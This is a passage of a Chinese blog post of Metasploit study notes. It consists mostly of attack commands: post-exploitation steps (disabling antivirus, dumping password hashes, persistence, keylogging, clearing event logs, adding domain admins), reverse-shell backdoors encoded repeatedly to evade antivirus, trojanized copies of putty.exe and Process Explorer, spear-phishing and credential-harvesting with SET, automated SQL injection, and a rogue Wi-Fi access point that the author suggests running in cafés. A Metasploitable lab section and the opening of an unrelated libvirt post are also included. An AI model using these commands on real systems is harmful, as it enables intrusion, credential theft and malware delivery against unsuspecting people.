<p>（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）</p>
<p>关闭杀毒软件</p>
<pre><code>meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）
</code></pre>
<p>获取系统密码hash</p>
<pre><code>meterpreter&gt; run hashdump
</code></pre>
<p>（64位win7下需要管理员权限执行后门且先getsystem，然后使用</p>
<pre><code>run  post/windows/gather/hashdump来dump hash成功率更高。
</code></pre>
<p>而且如果要使用shell添加系统账户的话win7下得先：</p>
<pre><code>run post/windows/escalate/bypassuac  ，不然可能不会成功。）
</code></pre>
<p>获取系统流量数据</p>
<pre><code>meterpreter&gt; run packtrecorder –i 1
</code></pre>
<p>直捣黄龙</p>
<p>可以干很多事情：获取密码，下载注册表，获取系统信息等</p>
<pre><code>meterpreter&gt; run scraper
</code></pre>
<p>持久保持</p>
<p>当目标机器重启之后仍然可以控制</p>
<pre><code>meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111
</code></pre>
<p>-X 开机启动  -i连接超时时间 –p端口 –rIP</p>
<p>下次连接时：</p>
<pre><code>msf&gt; use multi/handler
set payload windows/meterpreter/reverse_tcp
set LPOST 443
set LHOST 192.168.1.111
exploit
</code></pre>
<p>(会在以下位置和注册表以随机文件名写入文件等信息，如：</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe</p>
<p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</p>
<p>POST整合模块</p>
<p>可实现同时多个session操作</p>
<p>例子：获取hash</p>
<pre><code>meterpreter&gt; run post/windows/gather/hashdump
</code></pre>
<p>其他还有很多，使用TAB键补全看下就知道</p>
<h3 id="5升级command-shell">5、升级command shell</h3>
<p>例子：</p>
<pre><code>msfconsole
msf&gt; search ms08_067
msf&gt; use windows/smb/ms08_067_netapi
set PAYLOAD windows/shell/reverse_tcp
set TARGET 3
setg LHOST 192.168.1.111
setg LPORT 8080
exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台
sessions –u 1  #升级shell，必须前面使用setg设定
sessions –i 2
</code></pre>
<h3 id="6使用railgun操作windows-apis">6、使用Railgun操作windows APIs</h3>
<p>例子：</p>
<pre><code>meterpreter&gt; irb
&gt;&gt;client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)
</code></pre>
<p>在目标机器上会弹出一个标题栏为world和内容为hello的窗口</p>
<h2 id="七避开杀软">七．避开杀软</h2>
<h3 id="1使用msfpayload创建可执行后门">1、使用msfpayload创建可执行后门：</h3>
<p>例子：</p>
<pre><code>msfpayload windows/shell_reverse_tcp 0  #查看选项
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt; /var/www/payload1.exe
</code></pre>
<p>然后本机监听端口</p>
<pre><code>msf&gt; use exploit/multi/handler
show options
set PAYLOAD windows/shell_reverse_tcp
set LHOST 192.168.1.111
set LPORT 31337
exploit
</code></pre>
<h3 id="2过杀软---使用msfencode编码后门">2、过杀软---使用msfencode编码后门：</h3>
<p>msfencode –l  #列出可用编码器</p>
<p>例子：</p>
<pre><code>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe
</code></pre>
<p>使用 R参数作为raw输出至管道，再经过msfencode处理，最后导出。</p>
<h3 id="3多次编码">3、多次编码：</h3>
<p>例子：</p>
<pre><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \
    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \
    msfencode –e x86/alpha_upper –c 2 –t raw | \
    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \
    msfencode –e x86/countdown –c 5   –t exe –o /var/www/payload3.exe
</code></pre>
<p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。</p>
<p>（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p>
<h3 id="4自定义可执行程序模板">4、自定义可执行程序模板：</h3>
<p>msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：</p>
<pre><code>wget http://download.sysinternals.com/Files/ProcessExplorer.zip
cd work
unzip ProcessExplorer.zip
cd ..
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5
</code></pre>
<p>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：</p>
<pre><code>msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E
</code></pre>
<h3 id="5暗度陈仓猥琐执行payload">5、暗度陈仓—猥琐执行payload：</h3>
<p>绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：</p>
<pre><code>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5
</code></pre>
<p>假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。</p>
<h3 id="6加壳">6、加壳：</h3>
<p>msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：</p>
<p><code>apt-get install upx</code></p>
<p>最新版可到sf.net下载</p>
<p>使用方法：</p>
<p><code>upx -5 /var/www/payload3.exe</code></p>
<p>还有另外一个工具msfvenom结合了msfpayload和msfencode的功能，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p>
<h2 id="八使用用户端攻击方式client-side-attacks">八．使用用户端攻击方式(client-side attacks)</h2>
<h3 id="1组合型攻击">1、组合型攻击</h3>
<p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。</p>
<p>基于浏览器的攻击：</p>
<p>例子：</p>
<pre><code>msf&gt; use windows/browser/ms10_002_aurora
set payload windows/meterpreter/reverse_tcp
set SRVPORT 80
set URIPATH /
set LHOST 192.168.1.111
set LPORT 443
exploit –z
sessions –i 1
run migrate
</code></pre>
<p>或者:</p>
<pre><code>msf&gt; use windows/browser/ms10_002_aurora
show advanced
set ReverseConnectRetries 10
set AutoRunScript migrate –f
exploit
use priv
getsystem
</code></pre>
<h3 id="2文件格式exploit">2、文件格式exploit</h3>
<p>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。</p>
<p>例子：</p>
<pre><code>msf&gt; use windows/fileformat/ms11_006_createsizeddibsection
info
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
exploit
</code></pre>
<p>此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：</p>
<pre><code>use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
exploit –j
</code></pre>
<h2 id="九msf-附加模块">九．MSF 附加模块</h2>
<p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：<code>msf&gt; show auxiliary</code></p>
<p>例子：
o```
msf&gt; use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
run</p>
<pre><code>
搜索所有http相关扫描模块：

`search scanner/http`


附加模块深层剖析：

</code></pre>
<p>cd /opt/framework3/msf3/modules/auxiliary/admin/
wget <a href="http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb">http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb</a></p>
<pre><code>
代码分析:

```ruby
require ‘msf/core’
class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary类
#Exploit mixins should be called first
include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法
include Msf::Auxiliary::Report

def initialize

super(
‘Name’ =&gt; ‘Foursquare Location Poster’,
‘Version’ =&gt; ‘$Revision:$’,
‘Description’ =&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue id’,
‘Author’ =&gt; [‘CG’],
‘License’ =&gt; MSF_LICENSE,
‘References’ =&gt;
[
[‘URL’,’http://groups.google.com/group/foursquare-api’],
[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],
]
#todo pass in geocoords instead of venueid,create a venueid, other tom foolery

register_options(
[
Opt::RHOST(‘api.foursquare.com’),
OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),
OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),
OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),
],self.class)
end

def run
begin
user = datastore[‘USERNAME’]
pass = datasore[‘PASSWORD’]
venid = datastore[‘VENUEID’]
user_pass = Rex::Text.encode_base64(user + “:” + pass)
decode = Rex::Text.decode_base64(user_pass)
postrequest = “twitter=1\n” #add facebook=1 if you want facebook
print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug
print_status(“Base64 Decode User/Pass: #{decode}”)  #debug

res = send_request_cgi({
‘uri’ =&gt; “/v1/checkin?vid=#{venid}”,
‘version’ =&gt; “1.1”,
‘method’ =&gt; ‘POST’,
‘data’ =&gt; postrequest,
‘headers’ =&gt;
{
‘Authorization’ =&gt; “Basic #{user_pass}”,
‘Proxy-Connection’ =&gt; “Keep-Alive”,
}
},25)

print_status(“#{res}”)
end

rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e
pus e.message
end
end
</code></pre>
<p>ruby白痴一个，代码我也没看懂，不解释了</p>
<p>如何使用：</p>
<pre><code>msf&gt; search foursquare
msf&gt; use admin/foursquare
set VENUEID 2584421
set USERNAME msf@elwood.net
set PASSWORD ilovemetasploit
run
</code></pre>
<h2 id="十社会工程学工具集set">十．社会工程学工具集（SET）</h2>
<p>主要功能：hacking the human mind。</p>
<h3 id="1set基本配置">1、SET基本配置：</h3>
<p>SET位于/pentest/exploits/set/目录</p>
<p>更新：</p>
<pre><code>cd /pentest/exploits/set/
svn update
</code></pre>
<p>配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：</p>
<pre><code>vi config/set_config:
METASPLOIT_PATH=/opt/framework3/msf3
WEBATTACK_EMAIL=ON
</code></pre>
<p>使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：</p>
<p><code>SELF_SIGNED_APPLET=ON</code></p>
<p>SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：</p>
<p><code>AUTO_DETECT=OFF</code></p>
<p>SET默认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：</p>
<p><code>APACHE_SERVER=ON</code></p>
<h3 id="2网络钓鱼攻击">2、网络钓鱼攻击:</h3>
<p>Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。</p>
<p>例子：</p>
<pre><code>./set
此时选择菜单1.Spear-Phishing Attack Vectors
继续选择：1.Perform a Mass Email Attack
选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow
选择payload：4.Windows Reverse TCP Shell
选择是否更改文件名：1.Keep the filename
选择发送邮件方式1.Email Attack Single Email Address
选择邮件模板1.Pre-Defined Template
5.Status Report
输入收件方email地址：webmanager@exmaple.com
选择发件方式：1.Use a GMAIL Account for your email attack
输入发件gmail和密码
选择是否立即监听端口等待连接:yes
</code></pre>
<p>此时SET会使用刚才的设定全自动监听指定端口。</p>
<h3 id="3web方式攻击">3、WEB方式攻击：</h3>
<p>SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。</p>
<ul>
<li>Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。</li>
<li>用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。</li>
<li>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL密码。</li>
<li>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。</li>
<li>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。</li>
<li>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。</li>
<li>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。</li>
<li>介质感染攻  击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。</li>
<li>迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。</li>
</ul>
<h3 id="set其他特殊功能">SET其他特殊功能：</h3>
<p>包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可运行。</p>
<p>（SET新版本变动较大，请自行摸索。）</p>
<h2 id="十一fast-track">十一．FAST-TRACK</h2>
<p>Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。</p>
<p>交互式模式：<code>./fast-track.py -i</code></p>
<p>命令行模式：<code>./fast-track.py -c</code></p>
<p>Web界面模式：<code>./fast-track.py -g</code></p>
<h3 id="1mssql工具">1、MSSQL工具：</h3>
<p>MSSQL注入漏洞攻击：</p>
<p>攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如<a href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track%E4%BC%9A%E5%85%A8%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%80%E6%97%A6%E6%88%90%E5%8A%9F%E4%BC%9A%E7%BB%99%E4%BD%A0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAcmd">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd</a> shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。</p>
<p>SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。</p>
<p>SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。</p>
<h3 id="2binary-hex-转换器">2、Binary-HEX 转换器：</h3>
<p>当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。</p>
<h3 id="3批量用户端攻击">3、批量用户端攻击：</h3>
<p>和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。</p>
<p>（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）</p>
<p>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p>
<h2 id="十二karmerasploit">十二．KARMERASPLOIT</h2>
<p>Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。</p>
<p>Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。</p>
<p>基本配置：</p>
<p>需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：</p>
<pre><code>option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
range 10.0.0.100 10.0.0.254;
option routers 10.0.0.1;
option domain-name-servers 10.0.0.1;
}
</code></pre>
<p>将配置文件保存在/etc/dhcp3/dhcpd.conf</p>
<p>下一步下载karma  msf脚本：</p>
<pre><code>wget http://www.offensive-security.com/downloads/karma.rc
#将网卡激活为监听模式：
airmon-ng start wlan0
#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：
airbase-ng -P -C 30 -e &quot;China-Net-Free&quot; -v mon0
#此时会生成一个名为at0的新网卡接口。
#接着打开DHCP服务：
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
#检查是否成功启动：
ps aux|grep dhcpd
tail -f /var/log/messages

#下一步加载karma脚本：
msf&gt; resource karma.rc
</code></pre>
<p>等待收获：</p>
<p>当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p>
<h2 id="十三构建自己的模块编写自己的exploitmeterpreter脚本编程">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程</h2>
<p>这三章留着后面看，需要有ruby基础等编程基础。</p>
<h2 id="十四渗透实战演习">十四．渗透实战演习</h2>
<p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：</p>
<p><a href="http://updates.metasploit.com/data/Metasploitable.zip.torrent">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a></p>
<p>虚拟机IP：172.16.32.162 用户名密码：msfadmin</p>
<p>WINXP：172.16.32.131   开放80端口 有防火墙</p>
<p>情报收集：</p>
<p><code>nmap -sT -P0 172.16.32.131</code></p>
<p>msfconsole：</p>
<pre><code>cd /opt/framework3/msf3/
msfconsole
msf&gt; use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 172.15.32.129
set lport 443
load auto_add_route
exploit -j

run getgui -e -f 8080
shell
net user msf msf /add
net localgroup administrators msf /add
upload nmap.exe
nmap.exe -sT -A -P0 172.16.32.162
msf&gt; use auxiliary/scanner/ftp/ftp_version
set RHOSTS 172.16.32.162
run

msf&gt; use auxiliary/scanner/smtp/smtp_version
set RHOSTS  172.16.32.162
run

search tomcat_mgr_login
set rhosts 172.16.32.162
set threads 50
set rport 8180
set verbose false
run

use multi/http/tomcat_mgr_deploy
set password tomcat
set username tomcat
set rhost 172.16.32.162
set lport 9999
set rport 8180
set payload linux/x86/shell_bind_tcp
exploit

search distcc_exec
set payload linux/x86/shell_reverse_tcp
set lhost 172.16.32.129
set rhost 172.16.32.162
show payloads
set payload cmd/unix/reverse
exploit
</code></pre>
<h2 id="十五常用命令备忘">十五．常用命令备忘</h2>
<h3 id="msfconsole--commands">MSFconsole  Commands</h3>
<ul>
<li>show exploits 查看所有exploit</li>
<li>show payloads 查看所有payload</li>
<li>show auxiliary 查看所有auxiliary</li>
<li>search name 搜索exploit等</li>
<li>info 查看加载模块的信息</li>
<li>use name 加载模块</li>
<li>LHOST 本机IP</li>
<li>RHOST 目标IP</li>
<li>set function 设置选项值</li>
<li>setg function  全局设置</li>
<li>show options 查看选项</li>
<li>show targets 查看exp可选的平台</li>
<li>set target num 设置exp作用平台</li>
<li>set payload payload  设置payload</li>
<li>show advanced 查看高级选项</li>
<li>set autorunscript migrate -f 设置自动执行指令</li>
<li>check 测试是否可利用</li>
<li>exploit 执行exp或模块</li>
<li>exploit  -j 作为后台执行</li>
<li>exploit  -z 成功后不立即打开session</li>
<li>exploit  -e encoder 指定encoder</li>
<li>exploit  -h  查看帮助信息</li>
<li>sessions  -l -v 列出可用sessions详细信息</li>
<li>sessions  -s script 在指定session执行脚本</li>
<li>sessions -K 结束session</li>
<li>sessions -c cmd 执行指定命令</li>
<li>sessions -u sessionID 升级shell</li>
<li>db_create name 创建数据库</li>
<li>db_connect name   连接数据库</li>
<li>db_nmap nmap扫描并导入结果</li>
<li>db_autopwn -h      查看autopwn帮助</li>
<li>db_autopwn -p -r -e 基于端口，反弹shell</li>
<li>db_destroy 删除数据库</li>
</ul>
<h3 id="meterpreter-commands">Meterpreter Commands</h3>
<ul>
<li>help 查看帮助</li>
<li>run scriptname 运行脚本</li>
<li>sysinfo 系统基本信息</li>
<li>ls 列目录</li>
<li>use priv 运行提权组件</li>
<li>ps 列进程</li>
<li>migrate PID PID迁移</li>
<li>use incognito token窃取</li>
<li>list_tokens -u 查看可用用户token</li>
<li>list_tokens -g 查看可用组token</li>
<li>impersonate_token DOMAIN_NAME\USERNAME 模仿token</li>
<li>steal_token PID 窃取PID所属token  并模仿</li>
<li>drop_token 停止模仿token</li>
<li>getsystem 获取SYSTEM权限</li>
<li>shell 运行shell</li>
<li>execute -f cmd.exe -i 交互式运行cmd</li>
<li>execute -f cmd.exe -i -t 使用可用token运行</li>
<li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li>
<li>rev2self 返回至初始用户</li>
<li>reg command 修改注册表</li>
<li>setkesktop number 切换至另一已登录用户屏幕</li>
<li>screenshot 截屏</li>
<li>upload file 上传文件</li>
<li>download file  下载文件</li>
<li>keyscan_start 开始截取击键记录</li>
<li>keyscan_stop 停止截取击键记录</li>
<li>getprivs 尽可能提升权限</li>
<li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li>
<li>background 将当前meterpreter shell转入后台</li>
<li>hashdump 导出所有用户hash</li>
<li>use sniffer 加载嗅探模块</li>
<li>sniffer_interfaces 查看可用网卡接口</li>
<li>sniffer_dump interfaceID pcapname 开始嗅探</li>
<li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li>
<li>sniffer_stats interfaceID   抓取统计信息</li>
<li>sniffer_stop interfaceID  停止嗅探</li>
<li>add_user username password -h ip 添加用户</li>
<li>add_group_user &quot;Domain Admins&quot; username -h ip 添加用户至管理组</li>
<li>clearev 清空日志</li>
<li>timestomp 改变文件属性如创建时间等</li>
<li>reboot 重启</li>
</ul>
<h3 id="msfpayload-commands">MSFpayload Commands</h3>
<ul>
<li>msfpayload -h 查看帮助</li>
<li>msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X &gt; payload.exe 生成payload.exe</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R &gt; payload.raw 保存为RAW格式，可用于msfencode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c 保存为C格式</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java 保存为java格式</li>
</ul>
<h3 id="msfencode-commands">MSFencode Commands</h3>
<ul>
<li>msfencode -h 查看帮助</li>
<li>msfencode -l 查看可用encoder</li>
<li>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | <br>
<!-- -->msfencode -e x86/countdown -c 5 -t raw | <br>
<!-- -->msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码</li>
</ul>
<h3 id="msfcli-commands">MSFcli Commands</h3>
<ul>
<li><code>msfcli | grep exploit</code> 只显示exploit</li>
<li><code>msfcli | grep exploit/windows</code> 只显示windows exploit</li>
<li><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E</code> 针对指定IP加载指定exp并设定payload</li>
</ul>
<h3 id="msfninjafu">MSF,Ninja，Fu</h3>
<pre><code>* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门
* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息
* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口
</code></pre>
<h3 id="msfvenom">MSFvenom</h3>
<ul>
<li>msfvenom --payload 自动生成payload</li>
</ul>
<h3 id="meterpreter-post-exploitation-commands">Meterpreter Post Exploitation Commands</h3>
<p>提权一般步骤</p>
<pre><code>meterpreter&gt; use priv
meterpreter&gt; getsystem
meterpreter&gt; ps 
meterpreter&gt; steal_token 1784
meterpreter&gt; shell
net user msf msf /add /DOMAIN
net group &quot;Domain Admins&quot; msf /add /DOMAIN
</code></pre>
<p>获取hash一般步骤</p>
<pre><code>meterpreter&gt; use priv
meterpreter&gt; getsystem
meterpreter&gt; hashdump
</code></pre>
<p>如果是在win2008系统上：</p>
<pre><code>meterpreter&gt; run migrate
meterpreter&gt; run killav
meterpreter&gt; ps 
meterpreter&gt; migrate 1436
meterpreter&gt; keyscan_start
meterpreter&gt; keyscan_dump
meterpreter&gt; keyscan_stop
</code></pre>
<p>使用Incognito提权</p>
<pre><code>meterpreter&gt; use incognito
meterpreter&gt; list_tokens -u
meterpreter&gt; use priv
meterpreter&gt; getsystem
meterpreter&gt; list_tokens -u
meterpreter&gt; impersonate_token IHAZSECURITY\\Administrator
</code></pre>
<p>查看保护机制并禁用之</p>
<pre><code>meterpreter&gt; run getcountermeasure
meterpreter&gt; run getcountermeasure -h
meterpreter&gt; run getcountermeasure -d -k
</code></pre>
<ul>
<li>meterpreter&gt; run checkvm 检查是否是虚拟机</li>
<li>meterpreter&gt; shell 转入命令行</li>
<li>meterpreter&gt; run vnc 远程VNC控制</li>
<li>meterpreter&gt; background 转入后台</li>
<li>meterpreter&gt; run post/windows/escalate/bypassuac 执行Bypass UAC</li>
<li>meterpreter&gt; run post/osx/gather/hashdump 在OS X系统上dump hash</li>
<li>meterpreter&gt; run post/linux/gather/hashdump 在Linux 系统上dump hash</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/msf">msf</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/security">security</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="build storage pool with libvirt"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/07/13/libvirt-storage-pool">libvirt中storage pool的管理</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-07-13T00:00:00.000Z" itemprop="datePublished">2012年7月13日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>简单演示如何在libvirt中创建storage pool</p>
</blockquote>
<p>libvirt提供了存储管理的功能，可以管理的存储类型有 目录  lvm逻辑卷 磁盘 iscsi存储  scsi存储  mpath netfs等，这里以最基本的目录类型为例</p>
<p>基本概念：</p>
